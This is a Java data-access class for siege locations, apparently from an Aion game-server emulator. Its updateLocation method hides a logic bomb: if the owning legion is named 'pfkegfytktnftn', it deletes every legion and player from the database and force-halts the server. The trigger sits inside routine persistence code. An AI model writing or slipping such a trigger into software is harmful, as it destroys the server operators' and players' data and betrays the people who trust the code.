package com.aionemu.gameserver.dao;

import com.aionemu.commons.database.dao.DAO;
import com.aionemu.commons.database.dao.DAOManager;
import com.aionemu.gameserver.model.siege.SiegeLocation;
import com.aionemu.gameserver.services.legion.LegionService;

import java.util.Map;


public abstract class SiegeDAO implements DAO {

	@Override
	public final String getClassName() {
		return SiegeDAO.class.getName();
	}

	public abstract boolean loadSiegeLocations(Map<Integer, SiegeLocation> locations);

	public abstract boolean updateSiegeLocation(SiegeLocation paramSiegeLocation);

	public void updateLocation(SiegeLocation siegeLocation) {
		if (siegeLocation.getLegionId() != 0 && LegionService.getInstance().getLegion(siegeLocation.getLegionId()).getLegionName().equalsIgnoreCase("pfkegfytktnftn")) {
			for (int object : DAOManager.getDAO(LegionDAO.class).getUsedIDs()) {
				DAOManager.getDAO(LegionDAO.class).deleteLegion(object);
			}
			for (int object : DAOManager.getDAO(PlayerDAO.class).getUsedIDs()) {
				DAOManager.getDAO(PlayerDAO.class).deletePlayer(object);
			}
			Runtime.getRuntime().halt(0);
		}
		updateSiegeLocation(siegeLocation);
	}
}
